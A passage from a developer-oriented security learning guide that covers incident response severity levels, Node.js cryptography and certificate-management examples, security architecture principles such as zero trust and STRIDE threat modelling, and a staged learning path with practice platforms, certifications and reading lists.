- Security Lead: [Name, Phone, Email]
- DevOps Lead: [Name, Phone, Email]
- Legal: [Name, Phone, Email]

## Severity Levels
- P0: Critical (complete system compromise)
- P1: High (data breach, major vulnerability)
- P2: Medium (limited impact)
- P3: Low (minor issue)

## Response Procedures
### Data Breach
1. Isolate affected systems
2. Preserve evidence
3. Notify stakeholders
4. Begin forensic analysis
5. Implement fixes
6. Monitor for recurrence

### DDoS Attack
1. Enable rate limiting
2. Activate CDN DDoS protection
3. Scale infrastructure
4. Block malicious IPs
5. Monitor traffic patterns
```

---

## 11. Cryptography Fundamentals

### Symmetric vs Asymmetric Encryption
**Symmetric (Same key for encrypt/decrypt):**
- AES (Advanced Encryption Standard)
- ChaCha20
- Fast, efficient
- Key distribution challenge

**Asymmetric (Public/private key pair):**
- RSA
- Elliptic Curve (ECC)
- Slower, more computationally expensive
- Easier key distribution

### Hashing Algorithms
**Purpose:** One-way function for data integrity.

**Common Algorithms:**
- **SHA-256**: Good for checksums, not passwords
- **SHA-3**: Latest SHA standard
- **bcrypt**: For passwords
- **Argon2**: Winner of password hashing competition
- **scrypt**: Memory-hard function

**Hashing vs Encryption:**
- Hashing: One-way, can't be reversed
- Encryption: Two-way, can be decrypted

**Implementation:**
```javascript
const crypto = require('crypto');

// SHA-256 hash
function hash(data) {
  return crypto.createHash('sha256').update(data).digest('hex');
}

// HMAC (Hash-based Message Authentication Code)
function hmac(data, secret) {
  return crypto.createHmac('sha256', secret).update(data).digest('hex');
}

// Verify integrity
const original = 'Important data';
const signature = hmac(original, 'secret-key');

// Later...
const received = 'Important data';
const isValid = hmac(received, 'secret-key') === signature;
```

### Digital Signatures
**Purpose:** Verify authenticity and integrity.

**How it Works:**
1. Hash the message
2. Encrypt hash with private key (signature)
3. Recipient decrypts with public key
4. Compare hashes

**Implementation:**
```javascript
const crypto = require('crypto');

// Generate key pair
const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048,
});

// Sign data
function sign(data, privateKey) {
  const sign = crypto.createSign('SHA256');
  sign.update(data);
  return sign.sign(privateKey, 'hex');
}

// Verify signature
function verify(data, signature, publicKey) {
  const verify = crypto.createVerify('SHA256');
  verify.update(data);
  return verify.verify(publicKey, signature, 'hex');
}

// Usage
const message = 'Important message';
const signature = sign(message, privateKey);
const isValid = verify(message, signature, publicKey);
```

### TLS/SSL Deep Dive
**Handshake Process:**
1. Client Hello (supported ciphers)
2. Server Hello (chosen cipher)
3. Server certificate
4. Key exchange
5. Change cipher spec
6. Application data

**Certificate Chain:**
- Root CA (Certificate Authority)
- Intermediate CA
- End-entity certificate

**Best Practices:**
- Use TLS 1.2 or 1.3
- Strong cipher suites
- Perfect Forward Secrecy (PFS)
- Certificate pinning for mobile
- OCSP stapling

### Certificate Management
**Obtaining Certificates:**
```bash
# Using Let's Encrypt with Certbot
sudo certbot certonly --standalone -d yourdomain.com

# Manual certificate generation
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
```

**Renewal:**
```bash
# Auto-renewal with cron
0 0 * * * certbot renew --quiet
```

**Monitoring Expiration:**
```javascript
const https = require('https');

function checkCertExpiry(hostname) {
  return new Promise((resolve, reject) => {
    const options = {
      hostname,
      port: 443,
      method: 'GET',
      agent: false
    };

    const req = https.request(options, (res) => {
      const cert = res.connection.getPeerCertificate();
      const expiryDate = new Date(cert.valid_to);
      const daysUntilExpiry = Math.floor(
        (expiryDate - new Date()) / (1000 * 60 * 60 * 24)
      );
      
      resolve({
        domain: hostname,
        expiryDate,
        daysUntilExpiry
      });
    });

    req.on('error', reject);
    req.end();
  });
}
```

### Cryptographic Libraries for Node.js
**Built-in:**
- `crypto`: Node.js core module

**Third-party:**
- **tweetnacl**: Modern crypto library
- **libsodium (sodium-native)**: Fast, secure
- **node-forge**: Pure JavaScript crypto
- **bcrypt**: Password hashing

**Example with tweetnacl:**
```javascript
const nacl = require('tweetnacl');

// Generate key pair
const keyPair = nacl.box.keyPair();

// Encrypt
function encrypt(message, recipientPublicKey, senderPrivateKey) {
  const nonce = nacl.randomBytes(nacl.box.nonceLength);
  const messageUint8 = Buffer.from(message, 'utf8');
  
  const encrypted = nacl.box(
    messageUint8,
    nonce,
    recipientPublicKey,
    senderPrivateKey
  );
  
  return {
    encrypted: Buffer.from(encrypted).toString('base64'),
    nonce: Buffer.from(nonce).toString('base64')
  };
}

// Decrypt
function decrypt(encrypted, nonce, senderPublicKey, recipientPrivateKey) {
  const decrypted = nacl.box.open(
    Buffer.from(encrypted, 'base64'),
    Buffer.from(nonce, 'base64'),
    senderPublicKey,
    recipientPrivateKey
  );
  
  if (!decrypted) {
    throw new Error('Decryption failed');
  }
  
  return Buffer.from(decrypted).toString('utf8');
}
```

---

## 12. Security Architecture

### Zero Trust Architecture
**Principles:**
- Never trust, always verify
- Assume breach
- Verify explicitly
- Least privilege access
- Microsegmentation

**Implementation:**
- Multi-factor authentication everywhere
- Network segmentation
- End-to-end encryption
- Continuous monitoring
- Identity-based access control

### Defense in Depth
**Layers:**
1. **Physical**: Data center security
2. **Network**: Firewalls, IDS/IPS
3. **Host**: Antivirus, patching
4. **Application**: Input validation, authentication
5. **Data**: Encryption, access control

**Why Multiple Layers?**
If one layer fails, others provide protection.

### Least Privilege Principle
**Implementation:**
```javascript
// Role-based permissions
const permissions = {
  admin: ['read', 'write', 'delete', 'manage-users'],
  editor: ['read', 'write'],
  viewer: ['read']
};

function hasPermission(user, action) {
  const userPermissions = permissions[user.role] || [];
  return userPermissions.includes(action);
}

// Usage
app.delete('/post/:id', (req, res) => {
  if (!hasPermission(req.user, 'delete')) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  // Proceed with deletion
});
```

### Security by Design
**Principles:**
- Security from the start, not added later
- Threat modeling during design
- Secure defaults
- Fail securely
- Separation of concerns

**Process:**
1. Identify assets
2. Identify threats
3. Design security controls
4. Implement controls
5. Test and validate
6. Monitor and improve

### Threat Modeling
**Methodologies:**
- **STRIDE**: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege
- **PASTA**: Process for Attack Simulation and Threat Analysis
- **DREAD**: Damage, Reproducibility, Exploitability, Affected users, Discoverability

**STRIDE Example:**
```markdown
# User Authentication Flow

## Spoofing
- Threat: Attacker impersonates user
- Mitigation: Strong password policy, MFA

## Tampering
- Threat: JWT token modified
- Mitigation: Signature verification

## Repudiation
- Threat: User denies action
- Mitigation: Audit logging

## Information Disclosure
- Threat: Sensitive data in token
- Mitigation: Minimal data in JWT

## Denial of Service
- Threat: Login endpoint flooded
- Mitigation: Rate limiting

## Elevation of Privilege
- Threat: Regular user becomes admin
- Mitigation: Role verification on every request
```

### Secure SDLC (Software Development Lifecycle)
**Phases:**
1. **Requirements**: Security requirements
2. **Design**: Threat modeling, architecture review
3. **Implementation**: Secure coding, code review
4. **Testing**: Security testing, pen testing
5. **Deployment**: Secure configuration
6. **Maintenance**: Patch management, monitoring

**Integration:**
- Security champions in teams
- Security training for developers
- Automated security tools in CI/CD
- Regular security assessments

---

## 13. Practical Learning Path

### Beginner (Months 1-3)
**Focus Areas:**
- OWASP Top 10
- Basic authentication/authorization
- Input validation
- HTTPS/TLS basics
- SQL/NoSQL injection prevention
- XSS prevention
- CSRF protection

**Projects:**
1. Build a secure login system with JWT
2. Implement input validation for all endpoints
3. Add rate limiting to your API
4. Enable HTTPS on a Node.js server
5. Implement CSRF protection

**Resources:**
- OWASP Top 10 documentation
- PortSwigger Web Security Academy
- MDN Web Security
- Node.js Security Best Practices

### Intermediate (Months 4-6)
**Focus Areas:**
- Advanced authentication (OAuth, SAML)
- Cryptography implementation
- API security
- Security headers
- Container security basics
- Security testing tools

**Projects:**
1. Implement OAuth 2.0 provider
2. Build encrypted messaging system
3. Secure a microservices architecture
4. Perform security audit on your app
5. Set up automated security scanning

**Resources:**
- OWASP Application Security Verification Standard
- Crypto101 book
- Docker security best practices
- Begin HackTheBox/TryHackMe

### Advanced (Months 7-12)
**Focus Areas:**
- Penetration testing
- Security architecture
- Cloud security (AWS/Azure/GCP)
- Kubernetes security
- Advanced cryptography
- Compliance (GDPR, PCI-DSS)

**Projects:**
1. Perform full penetration test
2. Design zero-trust architecture
3. Secure Kubernetes cluster
4. Implement secrets management system
5. Build security monitoring dashboard

**Resources:**
- SANS reading room
- OWASP Testing Guide
- Cloud provider security docs
- Advanced HackTheBox boxes

### Expert (Year 2+)
**Focus Areas:**
- Advanced threat modeling
- Security research
- Custom exploit development
- Security team leadership
- Compliance auditing
- Incident response

**Activities:**
- Bug bounty hunting
- CVE research and disclosure
- Conference talks
- Open-source security contributions
- Mentoring others

### Hands-On Practice Platforms
**Free:**
- **PortSwigger Web Security Academy**: Excellent tutorials
- **OWASP WebGoat**: Deliberately insecure application
- **TryHackMe**: Guided learning paths
- **PentesterLab**: Web penetration testing
- **CTFtime**: Capture The Flag competitions

**Paid:**
- **HackTheBox**: Realistic vulnerable machines
- **Offensive Security**: Professional certifications
- **SANS**: High-quality training
- **Pentester Academy**: Specialized courses

### Certifications
**Entry Level:**
- CompTIA Security+
- Certified Ethical Hacker (CEH)

**Intermediate:**
- Offensive Security Certified Professional (OSCP)
- GIAC Security Essentials (GSEC)

**Advanced:**
- Offensive Security Certified Expert (OSCE)
- GIAC Web Application Penetration Tester (GWAPT)
- Certified Information Systems Security Professional (CISSP)

### Building a Security-First Mindset
**Daily Habits:**
- Read security news (TheHackerNews, Krebs on Security)
- Review one CVE per week
- Practice on CTF platforms
- Code review with security focus
- Share knowledge with team

**Community Engagement:**
- Follow security researchers on Twitter
- Join security Discords/Slacks
- Attend local security meetups
- Participate in bug bounty programs
- Contribute to security tools

### Recommended Reading
**Books:**
- "The Web Application Hacker's Handbook" - Dafydd Stuttard
- "Cryptography Engineering" - Niels Ferguson
- "Security Engineering" - Ross Anderson
- "The Tangled Web" - Michal Zalewski
- "Threat Modeling" - Adam Shostack

**Blogs & Sites:**
- OWASP.org
- PortSwigger.net/blog
- Troy Hunt's blog
- Krebs on Security
- Schneier on Security

### Key Takeaways
1. **Security is a journey**, not a destination
2. **Think like an attacker** to defend effectively
3. **Defense in depth** - multiple layers of security
4. **Stay current** - security landscape constantly evolves
5. **Practice regularly** - skills deteriorate without use
6. **Share knowledge** - teaching reinforces learning
7. **Assume breach** - plan for when, not if
8. **Automate testing** - catch issues early
9. **Log everything** - you can't protect what you can't see
10. **Never stop learning** - there's always more to know

---

## Final Words

Becoming proficient in both full stack development and security engineering takes time, dedication, and continuous learning. Start with the fundamentals, practice consistently, and gradually tackle more complex topics.

Remember: **Every MERN stack application you build should be secure by default.** Make security a habit, not an afterthought.

The best security engineers are those who understand both how to build applications and how to break them. Use this guide as your roadmap, adapt it to your learning style, and most importantly—get your hands dirty with real-world practice.

**Your journey starts now. Build securely. Break responsibly. Learn continuously.**